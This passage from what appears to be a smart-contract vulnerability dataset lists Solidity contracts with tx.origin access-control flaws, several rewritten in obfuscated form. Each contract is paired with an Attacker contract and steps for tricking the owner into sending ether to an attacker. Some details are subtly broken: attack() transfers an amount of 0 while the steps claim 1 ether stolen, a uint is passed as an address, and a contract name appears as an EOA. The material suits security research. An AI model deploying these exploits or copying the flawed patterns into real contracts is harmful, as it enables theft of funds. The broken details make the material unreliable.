            .Oxc5b831d54ce3bb6888d4ff5f44d287205eec8df4 = msg.sender;
    }

    function Ox2d6efb91e5366a7152910796a19a91d42a13693d(
        address Ox6907558a9e25e650210dc74bd0d6cd01d9bcf5a4,
        uint Ox6333ec7ded6005733d60d9cea4592ea5bd3d861d
    ) public {
        require(
            tx.origin ==
                Ox18dfdecc51017a829a2ae1032f70ecf81a13d131
                    .Oxc5b831d54ce3bb6888d4ff5f44d287205eec8df4
        );
        Ox6907558a9e25e650210dc74bd0d6cd01d9bcf5a4.transfer(
            Ox6333ec7ded6005733d60d9cea4592ea5bd3d861d
        );
    }

    struct scalar2Vector {
        address Oxc5b831d54ce3bb6888d4ff5f44d287205eec8df4;
    }
    scalar2Vector Ox18dfdecc51017a829a2ae1032f70ecf81a13d131 =
        scalar2Vector(address(0));
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Oxcdb1ba18a6dfffeb16b2b1dcab37d728499d0f1c(_victim).Ox2d6efb91e5366a7152910796a19a91d42a13693d(uint(attacker),0);
    }
    function () public payable{}
}

```

1. deploy contract `Oxcdb1ba18a6dfffeb16b2b1dcab37d728499d0f1c` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` , then get contract address `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01` [change]
2. //call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01`(victim contract address)[change] , transaction success
5. //attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether

### 12. mycontract.sol_confuse&Oxb3893c1f4ee789f5757dae823c3aa5ac82829a64

#### Source Code

```javascript
pragma solidity ^0.4.25;

contract Oxecd721153fd0679f76dbeea128d4a1e8605d9a9f {
    uint[] private Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98;

    constructor() public {
        Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98 = new uint[](
            7 + 4 + (4 + 3) - 18
        );
        Ox1d789b2b2ca89dce39ddc2b5e8cb1f5788b7af3d
            .Ox4dc2123868c02f623d825103096f8ead44701d88 = msg.sender;
    }

    function() public payable {}

    function Ox6af645bba7f7b4177ba24802d0f1d3c666c763c3(
        uint Ox993130385a185ac0d977cd7163de63e3f4df22de
    ) public {
        uint Oxee0894a536bb147613a94b9ced701e724a6ce0bc = (9 * 8) + 2 + 0 - 73;
        while (
            Oxee0894a536bb147613a94b9ced701e724a6ce0bc != 6 * 5 - 8 + 8 - 30
        ) {
            if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc == 9 + 1 * 2 + 0 - 10
            ) {
                Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98.push(
                    Ox993130385a185ac0d977cd7163de63e3f4df22de
                );
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    2 *
                    (7 + 4 + 9) -
                    40;
            }
        }
    }

    function Oxf1d8f269cb43f39f37ec824eabc5ea4f7a6154e0() public {
        uint Oxee0894a536bb147613a94b9ced701e724a6ce0bc = 4 * (5 + 6 + 5) - 63;
        while (
            Oxee0894a536bb147613a94b9ced701e724a6ce0bc != 9 + 8 - 4 * 3 - 5
        ) {
            if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc ==
                6 + 4 - (0 + 5) - 4
            ) {
                /*Access_control*/ require(
                    7 + 6 - 6 - 0 - 7 <=
                        Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98.length
                );
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    (3 + 7) +
                    6 -
                    8 -
                    6;
            } else if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc ==
                6 + 4 * 6 * 9 - 220
            ) {
                Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98.length--;
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    7 +
                    (1 + 3 * 2) -
                    14;
            }
        }
    }

    function Oxb3893c1f4ee789f5757dae823c3aa5ac82829a64(
        uint Oxeeadfb7eaa42d0850d11aec6d2e05a89a795c5b4,
        uint Ox993130385a185ac0d977cd7163de63e3f4df22de
    ) public {
        uint Oxee0894a536bb147613a94b9ced701e724a6ce0bc = 5 * 3 + (6 - 2) - 18;
        while (
            Oxee0894a536bb147613a94b9ced701e724a6ce0bc != 0 + 7 * 2 - 7 - 7
        ) {
            if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc == 3 + 0 + 3 + 5 - 10
            ) {
                require(
                    Oxeeadfb7eaa42d0850d11aec6d2e05a89a795c5b4 <
                        Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98.length
                );
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    2 +
                    (1 + 7 + 1) -
                    9;
            } else if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc == 7 * 4 + 9 - 8 - 27
            ) {
                Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98[
                    Oxeeadfb7eaa42d0850d11aec6d2e05a89a795c5b4
                ] = Ox993130385a185ac0d977cd7163de63e3f4df22de;
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc = 7 + 5 + 1 + 9 - 22;
            }
        }
    }

    function Oxb0933f775cc98f353475109df1e8fd523f052bd2() public {
        uint Oxee0894a536bb147613a94b9ced701e724a6ce0bc = 8 + 1 + 6 - 7 - 7;
        while (
            Oxee0894a536bb147613a94b9ced701e724a6ce0bc != 7 * 8 - 4 * 3 - 44
        ) {
            if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc ==
                (4 * 7) + 5 - 0 - 32
            ) {
                require(
                    msg.sender ==
                        Ox1d789b2b2ca89dce39ddc2b5e8cb1f5788b7af3d
                            .Ox4dc2123868c02f623d825103096f8ead44701d88
                );
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    6 +
                    (9 * 9 * 6) -
                    490;
            } else if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc ==
                (3 + 5 * 3) + 9 - 25
            ) {
                selfdestruct(msg.sender);
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    (5 - 3) *
                    4 -
                    7 -
                    1;
            }
        }
    }

    function Ox78e9ad626ebc6480a57c7a9692a1fa14f28ba834(
        uint256 Ox1ac9c624ac87a5af1e078b55e7f3bccd8a3e5ac5
    ) internal view returns (uint256) {
        return
            Oxcc57babc17ce0be2ad3d000dbe0902feaa2e17da[
                Ox1ac9c624ac87a5af1e078b55e7f3bccd8a3e5ac5
            ];
    }

    uint256[] public Oxcc57babc17ce0be2ad3d000dbe0902feaa2e17da = [
        6 - 4 + 7 + 2 - 10,
        7 * 5 * 6 + 6 - 216,
        7 + 8 - (4 - 1) - 10
    ];
    struct scalar2Vector {
        address Ox4dc2123868c02f623d825103096f8ead44701d88;
    }
    scalar2Vector Ox1d789b2b2ca89dce39ddc2b5e8cb1f5788b7af3d =
        scalar2Vector(address(0));
}

```



#### Exploit

```javascript
pragma solidity ^0.4.25;

contract Oxecd721153fd0679f76dbeea128d4a1e8605d9a9f {
    uint[] private Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98;

    constructor() public {
        Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98 = new uint[](
            7 + 4 + (4 + 3) - 18
        );
        Ox1d789b2b2ca89dce39ddc2b5e8cb1f5788b7af3d
            .Ox4dc2123868c02f623d825103096f8ead44701d88 = msg.sender;
    }

    function() public payable {}

    function Ox6af645bba7f7b4177ba24802d0f1d3c666c763c3(
        uint Ox993130385a185ac0d977cd7163de63e3f4df22de
    ) public {
        uint Oxee0894a536bb147613a94b9ced701e724a6ce0bc = (9 * 8) + 2 + 0 - 73;
        while (
            Oxee0894a536bb147613a94b9ced701e724a6ce0bc != 6 * 5 - 8 + 8 - 30
        ) {
            if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc == 9 + 1 * 2 + 0 - 10
            ) {
                Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98.push(
                    Ox993130385a185ac0d977cd7163de63e3f4df22de
                );
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    2 *
                    (7 + 4 + 9) -
                    40;
            }
        }
    }

    function Oxf1d8f269cb43f39f37ec824eabc5ea4f7a6154e0() public {
        uint Oxee0894a536bb147613a94b9ced701e724a6ce0bc = 4 * (5 + 6 + 5) - 63;
        while (
            Oxee0894a536bb147613a94b9ced701e724a6ce0bc != 9 + 8 - 4 * 3 - 5
        ) {
            if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc ==
                6 + 4 - (0 + 5) - 4
            ) {
                /*Access_control*/ require(
                    7 + 6 - 6 - 0 - 7 <=
                        Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98.length
                );
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    (3 + 7) +
                    6 -
                    8 -
                    6;
            } else if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc ==
                6 + 4 * 6 * 9 - 220
            ) {
                Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98.length--;
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    7 +
                    (1 + 3 * 2) -
                    14;
            }
        }
    }

    function Oxb3893c1f4ee789f5757dae823c3aa5ac82829a64(
        uint Oxeeadfb7eaa42d0850d11aec6d2e05a89a795c5b4,
        uint Ox993130385a185ac0d977cd7163de63e3f4df22de
    ) public {
        uint Oxee0894a536bb147613a94b9ced701e724a6ce0bc = 5 * 3 + (6 - 2) - 18;
        while (
            Oxee0894a536bb147613a94b9ced701e724a6ce0bc != 0 + 7 * 2 - 7 - 7
        ) {
            if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc == 3 + 0 + 3 + 5 - 10
            ) {
                require(
                    Oxeeadfb7eaa42d0850d11aec6d2e05a89a795c5b4 <
                        Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98.length
                );
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    2 +
                    (1 + 7 + 1) -
                    9;
            } else if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc == 7 * 4 + 9 - 8 - 27
            ) {
                Ox99c08d0baf7f32d12f7dc2124bc170cf11781b98[
                    Oxeeadfb7eaa42d0850d11aec6d2e05a89a795c5b4
                ] = Ox993130385a185ac0d977cd7163de63e3f4df22de;
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc = 7 + 5 + 1 + 9 - 22;
            }
        }
    }

    function Oxb0933f775cc98f353475109df1e8fd523f052bd2() public {
        uint Oxee0894a536bb147613a94b9ced701e724a6ce0bc = 8 + 1 + 6 - 7 - 7;
        while (
            Oxee0894a536bb147613a94b9ced701e724a6ce0bc != 7 * 8 - 4 * 3 - 44
        ) {
            if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc ==
                (4 * 7) + 5 - 0 - 32
            ) {
                require(
                    msg.sender ==
                        Ox1d789b2b2ca89dce39ddc2b5e8cb1f5788b7af3d
                            .Ox4dc2123868c02f623d825103096f8ead44701d88
                );
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    6 +
                    (9 * 9 * 6) -
                    490;
            } else if (
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc ==
                (3 + 5 * 3) + 9 - 25
            ) {
                selfdestruct(msg.sender);
                Oxee0894a536bb147613a94b9ced701e724a6ce0bc =
                    (5 - 3) *
                    4 -
                    7 -
                    1;
            }
        }
    }

    function Ox78e9ad626ebc6480a57c7a9692a1fa14f28ba834(
        uint256 Ox1ac9c624ac87a5af1e078b55e7f3bccd8a3e5ac5
    ) internal view returns (uint256) {
        return
            Oxcc57babc17ce0be2ad3d000dbe0902feaa2e17da[
                Ox1ac9c624ac87a5af1e078b55e7f3bccd8a3e5ac5
            ];
    }

    uint256[] public Oxcc57babc17ce0be2ad3d000dbe0902feaa2e17da = [
        6 - 4 + 7 + 2 - 10,
        7 * 5 * 6 + 6 - 216,
        7 + 8 - (4 - 1) - 10
    ];
    struct scalar2Vector {
        address Ox4dc2123868c02f623d825103096f8ead44701d88;
    }
    scalar2Vector Ox1d789b2b2ca89dce39ddc2b5e8cb1f5788b7af3d =
        scalar2Vector(address(0));
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Oxecd721153fd0679f76dbeea128d4a1e8605d9a9f(_victim).Oxb3893c1f4ee789f5757dae823c3aa5ac82829a64(uint(attacker),0);
    }
    function () public payable{}
}
```

1. deploy contract `Oxecd721153fd0679f76dbeea128d4a1e8605d9a9f` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` , then get contract address `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01` [change]
2. //call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01`(victim contract address)[change] , transaction success
5. //attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether

### 13. mycontract_variant_1&variantSendTo

#### Source Code

```javascript
/*
 * @source: https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-txorigin
 * @author: Consensys Diligence
 * @vulnerable_at_lines: 20
 * Modified by Gerhard Wagner
 */

pragma solidity ^0.4.24;

contract MyContract {

    address variantAddress;

    function MyContract() public {
        variantAddress = msg.sender;
    }

    function variantSendTo(address receiver, uint amount) public {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == variantAddress);
        receiver.transfer(amount);
    }

}

```



#### Exploit

```javascript
pragma solidity ^0.4.24;

contract MyContract {

    address variantAddress;

    function MyContract() public {
        variantAddress = msg.sender;
    }

    function variantSendTo(address receiver, uint amount) public {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == variantAddress);
        receiver.transfer(amount);
    }

}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        MyContract(_victim).variantSendTo(attacker,0);
    }
    function () public payable{}
}
```

1. deploy contract `MyContract` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` , then get contract address `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01` [change]
2. //call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01`(victim contract address)[change] , transaction success
5. //attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether



### 14. mycontract_variant_1_confuse&Oxc1135d97bb8f4b5569e7c76aef4f433c91b57722

#### Source Code

```javascript
pragma solidity ^0.4.24;

contract Ox1d1f17cbdddeb8491fcb4f7e3fba2dc4758a646c {
    function Ox1d1f17cbdddeb8491fcb4f7e3fba2dc4758a646c() public {
        Ox9afc7e92257e609679cc700d2f73cce16f9f212b
            .Ox7ad64b2ebbda5be77b245ded7e0e104be2dc9f16 = msg.sender;
    }

    function Oxc1135d97bb8f4b5569e7c76aef4f433c91b57722(
        address Oxda964958ba28e25bd0d81b58f927e57c8057daf8,
        uint Ox068375086ed88290618f91191733c275b0dd5919
    ) public {
        require(
            tx.origin ==
                Ox9afc7e92257e609679cc700d2f73cce16f9f212b
                    .Ox7ad64b2ebbda5be77b245ded7e0e104be2dc9f16
        );
        Oxda964958ba28e25bd0d81b58f927e57c8057daf8.transfer(
            Ox068375086ed88290618f91191733c275b0dd5919
        );
    }

    struct scalar2Vector {
        address Ox7ad64b2ebbda5be77b245ded7e0e104be2dc9f16;
    }
    scalar2Vector Ox9afc7e92257e609679cc700d2f73cce16f9f212b =
        scalar2Vector(address(0));
}

```



#### Exploit

```javascript
pragma solidity ^0.4.24;

contract Ox1d1f17cbdddeb8491fcb4f7e3fba2dc4758a646c {
    function Ox1d1f17cbdddeb8491fcb4f7e3fba2dc4758a646c() public {
        Ox9afc7e92257e609679cc700d2f73cce16f9f212b
            .Ox7ad64b2ebbda5be77b245ded7e0e104be2dc9f16 = msg.sender;
    }

    function Oxc1135d97bb8f4b5569e7c76aef4f433c91b57722(
        address Oxda964958ba28e25bd0d81b58f927e57c8057daf8,
        uint Ox068375086ed88290618f91191733c275b0dd5919
    ) public {
        require(
            tx.origin ==
                Ox9afc7e92257e609679cc700d2f73cce16f9f212b
                    .Ox7ad64b2ebbda5be77b245ded7e0e104be2dc9f16
        );
        Oxda964958ba28e25bd0d81b58f927e57c8057daf8.transfer(
            Ox068375086ed88290618f91191733c275b0dd5919
        );
    }

    struct scalar2Vector {
        address Ox7ad64b2ebbda5be77b245ded7e0e104be2dc9f16;
    }
    scalar2Vector Ox9afc7e92257e609679cc700d2f73cce16f9f212b =
        scalar2Vector(address(0));
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Ox1d1f17cbdddeb8491fcb4f7e3fba2dc4758a646c(_victim).Oxc1135d97bb8f4b5569e7c76aef4f433c91b57722(attacker,0);
    }
    function () public payable{}
}
```

1. deploy contract `MyContract` by victim EOA `Ox1d1f17cbdddeb8491fcb4f7e3fba2dc4758a646c` , then get contract address `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01` [change]
2. //call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01`(victim contract address)[change] , transaction success
5. //attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether

### 15. mycontract_variant_2&sendTo

#### Source Code

```javascript
/*
 * @source: https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-txorigin
 * @author: Consensys Diligence
 * @vulnerable_at_lines: 20
 * Modified by Gerhard Wagner
 */

pragma solidity ^0.4.24;

contract MyContract {

    address owner;

    function MyContract() public {
        owner = msg.sender;
    }

    function sendTo(address receiver, uint amount) public {
        // <yes> <report> ACCESS_CONTROL
        if(tx.origin == owner){
            receiver.transfer(amount);
        }
    }

}

```

#### Exploit

```javascript
pragma solidity ^0.4.24;

contract MyContract {

    address owner;

    function MyContract() public {
        owner = msg.sender;
    }

    function sendTo(address receiver, uint amount) public {
        // <yes> <report> ACCESS_CONTROL
        if(tx.origin == owner){
            receiver.transfer(amount);
        }
    }

}
contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        MyContract(_victim).sendTo(attacker,0);
    }
    function () public payable{}
}
```

1. deploy contract `MyContract` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` , then get contract address `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01` [change]
2. //call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01`(victim contract address)[change] , transaction success
5. //attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether

### 16. mycontract_variant_2_confuse&Ox3dda3625b8820b902b92bf0429aac3f7b5bbf1dd

#### Source Code

```javascript
pragma solidity ^0.4.24;

contract Ox8be8ab02b139dd44efe591c5b17cc44dd6ec2537 {
    function Ox8be8ab02b139dd44efe591c5b17cc44dd6ec2537() public {
        Oxb0e50381cdc889452983e46662cc5530b6f1032e
            .Oxd73f8fbdfa761f80298ed9025fa704f2ff2d5b41 = msg.sender;
    }

    function Ox3dda3625b8820b902b92bf0429aac3f7b5bbf1dd(
        address Ox016f7cc7f49c1a6a32e5ca274e4ec24136bf0474,
        uint Ox55ac6aa809eb83b577d45842ee61f5060596ab31
    ) public {
        if (
            tx.origin ==
            Oxb0e50381cdc889452983e46662cc5530b6f1032e
                .Oxd73f8fbdfa761f80298ed9025fa704f2ff2d5b41
        ) {
            Ox016f7cc7f49c1a6a32e5ca274e4ec24136bf0474.transfer(
                Ox55ac6aa809eb83b577d45842ee61f5060596ab31
            );
        }
    }

    struct scalar2Vector {
        address Oxd73f8fbdfa761f80298ed9025fa704f2ff2d5b41;
    }
    scalar2Vector Oxb0e50381cdc889452983e46662cc5530b6f1032e =
        scalar2Vector(address(0));
}

```

#### Exploit

```javascript
pragma solidity ^0.4.24;

contract Ox8be8ab02b139dd44efe591c5b17cc44dd6ec2537 {
    function Ox8be8ab02b139dd44efe591c5b17cc44dd6ec2537() public {
        Oxb0e50381cdc889452983e46662cc5530b6f1032e
            .Oxd73f8fbdfa761f80298ed9025fa704f2ff2d5b41 = msg.sender;
    }

    function Ox3dda3625b8820b902b92bf0429aac3f7b5bbf1dd(
        address Ox016f7cc7f49c1a6a32e5ca274e4ec24136bf0474,
        uint Ox55ac6aa809eb83b577d45842ee61f5060596ab31
    ) public {
        if (
            tx.origin ==
            Oxb0e50381cdc889452983e46662cc5530b6f1032e
                .Oxd73f8fbdfa761f80298ed9025fa704f2ff2d5b41
        ) {
            Ox016f7cc7f49c1a6a32e5ca274e4ec24136bf0474.transfer(
                Ox55ac6aa809eb83b577d45842ee61f5060596ab31
            );
        }
    }

    struct scalar2Vector {
        address Oxd73f8fbdfa761f80298ed9025fa704f2ff2d5b41;
    }
    scalar2Vector Oxb0e50381cdc889452983e46662cc5530b6f1032e =
        scalar2Vector(address(0));
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Ox8be8ab02b139dd44efe591c5b17cc44dd6ec2537(_victim).Ox3dda3625b8820b902b92bf0429aac3f7b5bbf1dd(attacker,0);
    }
    function () public payable{}
}
```

1. deploy contract `Ox8be8ab02b139dd44efe591c5b17cc44dd6ec2537` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` , then get contract address `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01` [change]
2. //call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01`(victim contract address)[change] , transaction success
5. //attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether



### 17. mycontract_variant_3&sendTo

#### Source Code

```javascript
/*
 * @source: https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-txorigin
 * @author: Consensys Diligence
 * @vulnerable_at_lines: 20
 * Modified by Gerhard Wagner
 */

pragma solidity ^0.4.24;

contract MyContract {

    address owner;

    function MyContract() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == owner,"Not owner");
        _;
    }

    function sendTo(address receiver, uint amount) public onlyOwner{
        receiver.transfer(amount);
    }

}

```



#### Exploit

```javascript
pragma solidity ^0.4.24;

contract MyContract {

    address owner;

    function MyContract() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        // <yes> <report> ACCESS_CONTROL
        require(tx.origin == owner,"Not owner");
        _;
    }

    function sendTo(address receiver, uint amount) public onlyOwner{
        receiver.transfer(amount);
    }

}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        MyContract(_victim).sendTo(attacker,0);
    }
    function () public payable{}
}
```

1. deploy contract `MyContract` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` , then get contract address `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01` [change]
2. //call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01`(victim contract address)[change] , transaction success
5. //attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether

### 18. mycontract_variant_3_confuse&Oxb6558714d8ec0f6c2d1f96eae271d6131968aace

#### Source Code

```javascript
pragma solidity ^0.4.24;

contract Oxd7fb6fb1716fba621f98c48baf3a6dbc1d774697 {
    function Oxd7fb6fb1716fba621f98c48baf3a6dbc1d774697() public {
        Ox4b572874fb55e6802a1b9e7418d19bcd5126ce87
            .Oxd77bc79645b9c144d7c08adb29685182254371e9 = msg.sender;
    }

    modifier Ox9ca735265c2b1bb985b98bc3f488286cf180656c() {
        require(
            tx.origin ==
                Ox4b572874fb55e6802a1b9e7418d19bcd5126ce87
                    .Oxd77bc79645b9c144d7c08adb29685182254371e9,
            Ox9e5a1351824cec9f0b65c74ebba71535ab7fac40((9 + 1 + 0) + 8 - 18)
        );
        _;
    }

    function Oxb6558714d8ec0f6c2d1f96eae271d6131968aace(
        address Oxbdc5997321f9e7cfb115ba62811faf47b1c9f0bf,
        uint Oxae87e735c2a2ed5970232335ca453a8752bac11b
    ) public Ox9ca735265c2b1bb985b98bc3f488286cf180656c {
        Oxbdc5997321f9e7cfb115ba62811faf47b1c9f0bf.transfer(
            Oxae87e735c2a2ed5970232335ca453a8752bac11b
        );
    }

    function Ox9e5a1351824cec9f0b65c74ebba71535ab7fac40(
        uint256 Ox8caf95cc74601ea21d4b4f33f3fa757386664bf9
    ) internal view returns (string storage) {
        return
            Ox74118039fc56cd42313b42f95f5880eb29a0cf38[
                Ox8caf95cc74601ea21d4b4f33f3fa757386664bf9
            ];
    }

    string[] public Ox74118039fc56cd42313b42f95f5880eb29a0cf38 = [
        "Not Oxd77bc79645b9c144d7c08adb29685182254371e9"
    ];
    struct scalar2Vector {
        address Oxd77bc79645b9c144d7c08adb29685182254371e9;
    }
    scalar2Vector Ox4b572874fb55e6802a1b9e7418d19bcd5126ce87 =
        scalar2Vector(address(0));
}

```



#### Exploit

```javascript
pragma solidity ^0.4.24;

contract Oxd7fb6fb1716fba621f98c48baf3a6dbc1d774697 {
    function Oxd7fb6fb1716fba621f98c48baf3a6dbc1d774697() public {
        Ox4b572874fb55e6802a1b9e7418d19bcd5126ce87
            .Oxd77bc79645b9c144d7c08adb29685182254371e9 = msg.sender;
    }

    modifier Ox9ca735265c2b1bb985b98bc3f488286cf180656c() {
        require(
            tx.origin ==
                Ox4b572874fb55e6802a1b9e7418d19bcd5126ce87
                    .Oxd77bc79645b9c144d7c08adb29685182254371e9,
            Ox9e5a1351824cec9f0b65c74ebba71535ab7fac40((9 + 1 + 0) + 8 - 18)
        );
        _;
    }

    function Oxb6558714d8ec0f6c2d1f96eae271d6131968aace(
        address Oxbdc5997321f9e7cfb115ba62811faf47b1c9f0bf,
        uint Oxae87e735c2a2ed5970232335ca453a8752bac11b
    ) public Ox9ca735265c2b1bb985b98bc3f488286cf180656c {
        Oxbdc5997321f9e7cfb115ba62811faf47b1c9f0bf.transfer(
            Oxae87e735c2a2ed5970232335ca453a8752bac11b
        );
    }

    function Ox9e5a1351824cec9f0b65c74ebba71535ab7fac40(
        uint256 Ox8caf95cc74601ea21d4b4f33f3fa757386664bf9
    ) internal view returns (string storage) {
        return
            Ox74118039fc56cd42313b42f95f5880eb29a0cf38[
                Ox8caf95cc74601ea21d4b4f33f3fa757386664bf9
            ];
    }

    string[] public Ox74118039fc56cd42313b42f95f5880eb29a0cf38 = [
        "Not Oxd77bc79645b9c144d7c08adb29685182254371e9"
    ];
    struct scalar2Vector {
        address Oxd77bc79645b9c144d7c08adb29685182254371e9;
    }
    scalar2Vector Ox4b572874fb55e6802a1b9e7418d19bcd5126ce87 =
        scalar2Vector(address(0));
}

contract Attacker {
    address public attacker;
    constructor (){
        attacker = msg.sender;
    }
    function attack(address _victim) public {
        Oxd7fb6fb1716fba621f98c48baf3a6dbc1d774697(_victim).Oxb6558714d8ec0f6c2d1f96eae271d6131968aace(attacker,0);
    }
    function () public payable{}
}
```

1. deploy contract `Oxd7fb6fb1716fba621f98c48baf3a6dbc1d774697` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` , then get contract address `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01` [change]
2. //call fallback function by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with 1 ether
3. deploy contract `Attacker` by attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`
4. call function `attack` by victim EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` with argument `0x5A86858aA3b595FD6663c2296741eF4cd8BC4d01`(victim contract address)[change] , transaction success
5. //attacker EOA `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` steals 1 ether





#### 